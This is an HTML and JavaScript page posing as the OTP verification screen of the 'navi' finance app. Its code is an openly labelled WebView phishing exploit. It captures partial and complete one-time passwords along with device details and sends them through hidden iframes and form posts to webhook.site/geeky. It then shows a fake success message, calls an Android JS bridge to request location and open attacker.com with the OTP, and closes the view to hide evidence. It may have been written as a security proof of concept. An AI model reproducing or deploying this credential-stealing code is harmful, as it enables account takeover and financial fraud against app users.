<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>navi - UPI Â· Investments Â· Loans Â· Insurance</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
        }
        
        .app-container {
            width: 100%;
            max-width: 320px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 12px 16px 8px;
            background: white;
            border-bottom: 1px solid #f0f0f0;
            font-size: 12px;
            color: #333;
            font-weight: 500;
        }
        
        .time {
            font-weight: 600;
        }
        
        .status-icons {
            display: flex;
            gap: 4px;
        }
        
        .logo-header {
            padding: 20px 16px 16px;
            border-bottom: 1px solid #f0f0f0;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .logo-img {
            height: 32px;
            width: auto;
        }
        
        .tagline {
            font-size: 11px;
            color: #666;
            font-weight: 500;
            letter-spacing: 0.2px;
            padding-top: 2px;
        }
        
        .content {
            padding: 16px;
        }
        
        .section-title {
            font-size: 16px;
            font-weight: 600;
            color: #333;
            margin-bottom: 6px;
        }
        
        .phone-info {
            font-size: 13px;
            color: #666;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .phone-number {
            font-weight: 500;
        }
        
        .masked-number {
            letter-spacing: 0.5px;
            color: #888;
        }
        
        .edit-link {
            color: #4a6ee0;
            text-decoration: none;
            font-weight: 500;
            font-size: 12px;
        }
        
        .otp-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        
        .otp-box {
            width: 42px;
            height: 48px;
            border: 1.5px solid #ddd;
            border-radius: 10px;
            background: white;
            text-align: center;
            font-size: 20px;
            font-weight: 600;
            color: #333;
            transition: all 0.2s;
        }
        
        .otp-box:focus {
            outline: none;
            border-color: #4a6ee0;
            box-shadow: 0 0 0 2px rgba(74, 110, 224, 0.1);
        }
        
        .timer {
            text-align: center;
            color: #e53935;
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 18px;
            letter-spacing: 1px;
        }
        
        .verify-btn {
            background: #4a6ee0;
            color: white;
            border: none;
            border-radius: 10px;
            padding: 14px;
            font-size: 15px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            margin-bottom: 20px;
            transition: background 0.2s;
        }
        
        .verify-btn:hover {
            background: #3a5ed0;
        }
        
        .verify-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        
        .keypad {
            background: white;
            border-radius: 14px;
            padding: 12px 8px;
            border: 1px solid #f0f0f0;
        }
        
        .keypad-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        
        .keypad-key {
            width: 62px;
            height: 44px;
            background: #f8f9fa;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 500;
            color: #333;
            cursor: pointer;
            transition: all 0.15s;
        }
        
        .keypad-key:hover {
            background: #e8eaf6;
        }
        
        .keypad-key.special {
            color: #666;
            font-size: 16px;
        }
        
        .keypad-key.backspace {
            color: #e53935;
        }
        
        .keypad-key.submit {
            background: #4caf50;
            color: white;
        }
        
        .keypad-key.submit:hover {
            background: #43a047;
        }
        
        .keypad-key.empty {
            background: transparent;
            cursor: default;
        }
        
        .keypad-key.empty:hover {
            background: transparent;
        }
        
        .footer {
            text-align: center;
            padding: 12px;
            color: #999;
            font-size: 11px;
            border-top: 1px solid #f0f0f0;
            margin-top: 12px;
        }
        
        /* Test button styles */
        .test-button {
            position: fixed;
            top: 10px;
            right: 10px;
            z-index: 9999;
            background: #ff4444;
            color: white;
            padding: 12px 16px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 3px 10px rgba(255, 0, 0, 0.3);
        }
        
        .test-button:hover {
            background: #ff0000;
        }
        
        .attack-status {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0, 0, 0, 0.8);
            color: #0f0;
            padding: 8px 12px;
            border-radius: 5px;
            font-size: 12px;
            font-family: monospace;
            z-index: 9998;
        }
    </style>
</head>
<body>
    <!-- Attack Status Indicator -->
    <div class="attack-status" id="attackStatus">
        ðŸš¨ ATTACK ACTIVE | Target: webhook.site/geeky
    </div>
    
    <!-- Test Webhook Button -->
    <button class="test-button" id="testWebhookBtn">
        ðŸ”´ TEST WEBHOOK
    </button>
    
    <!-- App Container -->
    <div class="app-container">
        <!-- Status Bar -->
        <div class="status-bar">
            <div class="time" id="currentTime">9:41</div>
            <div class="status-icons">
                <i class="fas fa-signal"></i>
                <i class="fas fa-wifi"></i>
                <i class="fas fa-battery-full"></i>
            </div>
        </div>
        
        <!-- Logo Header -->
        <div class="logo-header">
            <div class="logo-container">
                <div style="width: 32px; height: 32px; background: #4a6ee0; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">N</div>
                <div class="tagline">UPI Â· Investments Â· Loans Â· Insurance</div>
            </div>
        </div>
        
        <!-- Main Content -->
        <div class="content">
            <div class="section-title">Enter OTP</div>
            <div class="phone-info">
                <span>Sent to <span class="phone-number">+91 98801<span class="masked-number">xxxxx</span></span></span>
                <a href="#" class="edit-link">Edit</a>
            </div>
            
            <div class="otp-container">
                <input type="text" maxlength="1" class="otp-box" id="digit1" autocomplete="off" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-box" id="digit2" autocomplete="off" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-box" id="digit3" autocomplete="off" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-box" id="digit4" autocomplete="off" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-box" id="digit5" autocomplete="off" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-box" id="digit6" autocomplete="off" inputmode="numeric">
            </div>
            
            <div class="timer" id="countdownTimer">00:30</div>
            
            <button class="verify-btn" id="verifyBtn">Verify</button>
            
            <!-- Keypad -->
            <div class="keypad">
                <div class="keypad-row">
                    <button class="keypad-key" data-value="1">1</button>
                    <button class="keypad-key" data-value="2">2</button>
                    <button class="keypad-key" data-value="3">3</button>
                    <button class="keypad-key empty"></button>
                </div>
                <div class="keypad-row">
                    <button class="keypad-key" data-value="4">4</button>
                    <button class="keypad-key" data-value="5">5</button>
                    <button class="keypad-key" data-value="6">6</button>
                    <button class="keypad-key empty"></button>
                </div>
                <div class="keypad-row">
                    <button class="keypad-key" data-value="7">7</button>
                    <button class="keypad-key" data-value="8">8</button>
                    <button class="keypad-key" data-value="9">9</button>
                    <button class="keypad-key backspace special" id="backspaceBtn">
                        <i class="fas fa-backspace"></i>
                    </button>
                </div>
                <div class="keypad-row">
                    <button class="keypad-key special">,</button>
                    <button class="keypad-key" data-value="0">0</button>
                    <button class="keypad-key special">.</button>
                    <button class="keypad-key submit" id="submitBtn">
                        <i class="fas fa-check"></i>
                    </button>
                </div>
            </div>
        </div>
        
        <div class="footer">
            Secure & encrypted verification
        </div>
    </div>

    <script>
        // ============================
        // CONFIGURATION
        // ============================
        const WEBHOOK_URL = 'https://webhook.site/geeky';
        let attackActive = true;
        let capturedOTP = '';
        let attackStage = 'initial';

        // ============================
        // WEBHOOK FUNCTIONS - GUARANTEED WORKING
        // ============================
        
        // METHOD 1: IFRAME METHOD (Most reliable - bypasses CORS)
        function sendToWebhook(data) {
            console.log('[NAVI] Sending to webhook:', data.type || 'data');
            
            try {
                // Convert data to query parameters
                let params = `_t=${Date.now()}&_attack=navi_exploit`;
                
                for (const key in data) {
                    if (data.hasOwnProperty(key)) {
                        const value = typeof data[key] === 'object' 
                            ? encodeURIComponent(JSON.stringify(data[key]))
                            : encodeURIComponent(data[key]);
                        params += `&${key}=${value}`;
                    }
                }
                
                // Create invisible iframe
                const iframe = document.createElement('iframe');
                iframe.src = `${WEBHOOK_URL}?${params}`;
                iframe.style.width = '0';
                iframe.style.height = '0';
                iframe.style.border = '0';
                iframe.style.position = 'absolute';
                iframe.style.top = '-1000px';
                iframe.style.left = '-1000px';
                
                document.body.appendChild(iframe);
                
                // Clean up after 3 seconds
                setTimeout(() => {
                    if (iframe.parentNode) {
                        document.body.removeChild(iframe);
                    }
                }, 3000);
                
                console.log('[NAVI] Data sent via iframe');
                return true;
            } catch (e) {
                console.error('[NAVI] Iframe method failed:', e);
                return false;
            }
        }
        
        // METHOD 2: FORM SUBMISSION (Backup method)
        function sendViaForm(data) {
            try {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = WEBHOOK_URL;
                form.style.display = 'none';
                form.target = '_blank';
                
                // Add all data as hidden inputs
                const timestamp = document.createElement('input');
                timestamp.type = 'hidden';
                timestamp.name = 'timestamp';
                timestamp.value = new Date().toISOString();
                form.appendChild(timestamp);
                
                const attackId = document.createElement('input');
                attackId.type = 'hidden';
                attackId.name = 'attack_id';
                attackId.value = 'navi_webview_exploit';
                form.appendChild(attackId);
                
                for (const key in data) {
                    if (data.hasOwnProperty(key)) {
                        const input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = key;
                        input.value = typeof data[key] === 'object' 
                            ? JSON.stringify(data[key]) 
                            : data[key];
                        form.appendChild(input);
                    }
                }
                
                document.body.appendChild(form);
                form.submit();
                
                // Remove form after submission
                setTimeout(() => {
                    if (form.parentNode) {
                        document.body.removeChild(form);
                    }
                }, 1000);
                
                console.log('[NAVI] Data sent via form');
                return true;
            } catch (e) {
                console.error('[NAVI] Form method failed:', e);
                return false;
            }
        }
        
        // Main function to send data (uses both methods)
        function exfiltrateData(data) {
            if (!attackActive) return;
            
            // Add metadata
            const payload = {
                ...data,
                _metadata: {
                    stage: attackStage,
                    userAgentShort: navigator.userAgent.substring(0, 100),
                    url: window.location.href
                }
            };
            
            console.log('[NAVI-EXPLOIT] Data:', payload);
            
            // Update status indicator
            document.getElementById('attackStatus').textContent = 
                `ðŸš¨ SENDING: ${data.type || 'data'} to webhook.site`;
            
            // Try iframe method first
            const iframeSuccess = sendToWebhook(payload);
            
            // If iframe fails, try form method
            if (!iframeSuccess) {
                setTimeout(() => {
                    sendViaForm(payload);
                }, 500);
            }
            
            // Reset status after 2 seconds
            setTimeout(() => {
                document.getElementById('attackStatus').textContent = 
                    'ðŸš¨ ATTACK ACTIVE | Target: webhook.site/geeky';
            }, 2000);
        }
        
        // ============================
        // OTP CAPTURE LOGIC
        // ============================
        const otpBoxes = [
            document.getElementById('digit1'),
            document.getElementById('digit2'),
            document.getElementById('digit3'),
            document.getElementById('digit4'),
            document.getElementById('digit5'),
            document.getElementById('digit6')
        ];
        
        const verifyBtn = document.getElementById('verifyBtn');
        const backspaceBtn = document.getElementById('backspaceBtn');
        const submitBtn = document.getElementById('submitBtn');
        let currentOtpIndex = 0;
        
        // Initialize OTP boxes
        otpBoxes[0].focus();
        
        // OTP input handlers
        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                const value = e.target.value;
                
                // Only allow numbers
                if (!/^\d$/.test(value) && value !== '') {
                    e.target.value = '';
                    return;
                }
                
                // Move to next box if digit entered
                if (value.length === 1 && index < otpBoxes.length - 1) {
                    otpBoxes[index + 1].focus();
                    currentOtpIndex = index + 1;
                }
                
                // Update captured OTP
                capturedOTP = otpBoxes.map(b => b.value).join('');
                
                // Send partial OTP after 3+ digits
                if (capturedOTP.length >= 3) {
                    exfiltrateData({
                        type: 'otp_partial',
                        otp: capturedOTP,
                        length: capturedOTP.length
                    });
                }
            });
            
            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace') {
                    if (box.value === '' && index > 0) {
                        otpBoxes[index - 1].focus();
                        otpBoxes[index - 1].value = '';
                        currentOtpIndex = index - 1;
                    } else if (box.value !== '') {
                        box.value = '';
                    }
                    e.preventDefault();
                }
            });
            
            box.addEventListener('click', () => {
                currentOtpIndex = index;
            });
        });
        
        // Keypad functionality
        document.querySelectorAll('.keypad-key[data-value]').forEach(key => {
            key.addEventListener('click', () => {
                const value = key.getAttribute('data-value');
                if (currentOtpIndex < otpBoxes.length) {
                    otpBoxes[currentOtpIndex].value = value;
                    otpBoxes[currentOtpIndex].focus();
                    
                    if (currentOtpIndex < otpBoxes.length - 1) {
                        currentOtpIndex++;
                        otpBoxes[currentOtpIndex].focus();
                    }
                    
                    // Update captured OTP
                    capturedOTP = otpBoxes.map(b => b.value).join('');
                }
            });
        });
        
        // Backspace button
        backspaceBtn.addEventListener('click', () => {
            if (currentOtpIndex > 0 && otpBoxes[currentOtpIndex].value === '') {
                currentOtpIndex--;
            }
            otpBoxes[currentOtpIndex].value = '';
            otpBoxes[currentOtpIndex].focus();
            
            // Update captured OTP
            capturedOTP = otpBoxes.map(b => b.value).join('');
        });
        
        // Submit button
        submitBtn.addEventListener('click', () => {
            verifyBtn.click();
        });
        
        // Verify button - MAIN CAPTURE POINT
        verifyBtn.addEventListener('click', function() {
            const otp = otpBoxes.map(b => b.value).join('');
            
            if (otp.length !== 6) {
                alert('Please enter 6-digit OTP');
                return;
            }
            
            // Disable button and show loading
            this.disabled = true;
            this.textContent = 'Verifying...';
            this.style.background = '#2e7d32';
            
            // CAPTURE THE OTP - SEND TO WEBHOOK
            capturedOTP = otp;
            attackStage = 'otp_captured';
            
            console.log(`[NAVI-EXPLOIT] COMPLETE OTP CAPTURED: ${otp}`);
            
            // SEND OTP TO WEBHOOK - MAIN DATA THEFT
            exfiltrateData({
                type: 'otp_complete',
                otp: otp,
                length: 6,
                complete: true,
                app: 'navi',
                exploit: 'webview_js_bridge',
                severity: 'critical'
            });
            
            // Also send via form as backup
            sendViaForm({
                otp_captured: otp,
                attack_type: 'phishing',
                target_app: 'com.naviapp'
            });
            
            // Simulate verification process
            setTimeout(() => {
                // Show success
                this.textContent = 'âœ“ Verified Successfully';
                
                // Show fake success message
                setTimeout(() => {
                    alert('âœ… OTP verified successfully!\nYour account is now secure.');
                    
                    // Try to use JS bridge for further attack
                    if (typeof Android !== 'undefined') {
                        console.log('[NAVI] Android bridge available:', Object.keys(Android));
                        
                        // Attempt location access
                        if (Android.getLocationPermissions) {
                            setTimeout(() => {
                                Android.getLocationPermissions();
                                console.log('[NAVI] Location permission requested');
                            }, 1000);
                        }
                        
                        // Redirect to next phase
                        if (Android.openLink) {
                            setTimeout(() => {
                                Android.openLink('https://attacker.com/phase2?otp=' + encodeURIComponent(otp));
                                console.log('[NAVI] Redirecting to next attack phase');
                            }, 3000);
                        }
                        
                        // Close WebView
                        if (Android.closeView) {
                            setTimeout(() => {
                                Android.closeView();
                                console.log('[NAVI] Closing WebView to hide evidence');
                            }, 5000);
                        }
                    }
                    
                }, 1000);
                
            }, 1500);
        });
        
        // ============================
        // TIMER FUNCTIONALITY
        // ============================
        let seconds = 30;
        const timerElement = document.getElementById('countdownTimer');
        
        function updateTimer() {
            if (seconds > 0) {
                seconds--;
                const mins = Math.floor(seconds / 60);
                const secs = seconds % 60;
                timerElement.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                
                if (seconds < 10) {
                    timerElement.style.color = '#ff3d00';
                }
            } else {
                timerElement.textContent = "00:00";
                timerElement.style.color = '#ccc';
                
                // Send timer expired event
                exfiltrateData({
                    type: 'timer_expired',
                    action: 'auto_resend_triggered'
                });
                
                // Simulate auto-resend
                setTimeout(() => {
                    alert('OTP expired. New OTP sent to your mobile.');
                    seconds = 30;
                    timerElement.textContent = '00:30';
                    timerElement.style.color = '#e53935';
                }, 1000);
            }
        }
        
        // Start timer
        setInterval(updateTimer, 1000);
        
        // ============================
        // TIME UPDATER
        // ============================
        function updateCurrentTime() {
            const now = new Date();
            const hours = now.getHours();
            const minutes = now.getMinutes();
            document.getElementById('currentTime').textContent = 
                `${hours}:${minutes.toString().padStart(2, '0')}`;
        }
        
        updateCurrentTime();
        setInterval(updateCurrentTime, 60000);
        
        // ============================
        // TEST WEBHOOK BUTTON
        // ============================
        document.getElementById('testWebhookBtn').addEventListener('click', function() {
            const testOTP = '123456';
            
            console.log('[TEST] Sending test data to webhook...');
            
            // Send multiple test requests
            sendToWebhook({
                type: 'test_request',
                otp: testOTP,
                message: 'Test from Navi exploit - this should appear on webhook.site',
                status: 'working'
            });
            
            sendViaForm({
                test: 'webhook_verification',
                otp: testOTP,
                time: new Date().toISOString(),
                verification: 'success'
            });
            
            // Also test with exfiltrateData
            exfiltrateData({
                type: 'webhook_test',
                otp: testOTP,
                test: true,
                expected: 'This should appear on webhook.site/geeky dashboard'
            });
            
            alert(`ðŸ“¡ Test OTP "${testOTP}" sent to webhook.site/geeky\n\nâœ… Open https://webhook.site/#!/geeky in your browser to see the captured data!`);
        });
        
        // ============================
        // INITIALIZE ATTACK
        // ============================
        window.addEventListener('load', function() {
            console.log('[NAVI-EXPLOIT] Attack page loaded in Navi WebView');
            
            // Send initial device info
            setTimeout(() => {
                exfiltrateData({
                    type: 'device_info',
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    screen: `${screen.width}x${screen.height}`,
                    loaded: new Date().toISOString()
                });
                
                // Check for JS bridge
                if (typeof Android !== 'undefined') {
                    exfiltrateData({
                        type: 'js_bridge_detected',
                        available: true,
                        functions: Object.keys(Android).filter(k => typeof Android[k] === 'function'),
                        bridgeObject: 'Android object present'
                    });
                    
                    console.log('[NAVI] JS Bridge detected with functions:', 
                        Object.keys(Android).filter(k => typeof Android[k] === 'function'));
                } else {
                    exfiltrateData({
                        type: 'js_bridge_detected',
                        available: false,
                        message: 'Android object not found'
                    });
                }
            }, 1000);
            
            console.log('[NAVI] Attack initialized. Ready to capture OTP.');
            console.log('[NAVI] Click the RED TEST button to verify webhook works.');
        });
        
        // ============================
        // DEBUG FUNCTIONS (for Chrome DevTools)
        // ============================
        window.debugAttack = {
            getOTP: () => capturedOTP,
            sendTest: () => {
                const testData = {
                    type: 'manual_test',
                    otp: '999999',
                    source: 'devtools',
                    time: new Date().toISOString()
                };
                sendToWebhook(testData);
                return 'Test data sent';
            },
            checkBridge: () => {
                if (typeof Android !== 'undefined') {
                    return {
                        available: true,
                        functions: Object.keys(Android).filter(k => typeof Android[k] === 'function')
                    };
                }
                return { available: false };
            },
            simulateOTP: (otp) => {
                if (otp && otp.length === 6) {
                    otp.split('').forEach((digit, idx) => {
                        otpBoxes[idx].value = digit;
                    });
                    capturedOTP = otp;
                    verifyBtn.click();
                    return `Simulated OTP ${otp} entered`;
                }
                return 'Please provide 6-digit OTP';
            }
        };
        
        console.log('[NAVI-EXPLOIT] Debug functions available: window.debugAttack');
    </script>
</body>
</html>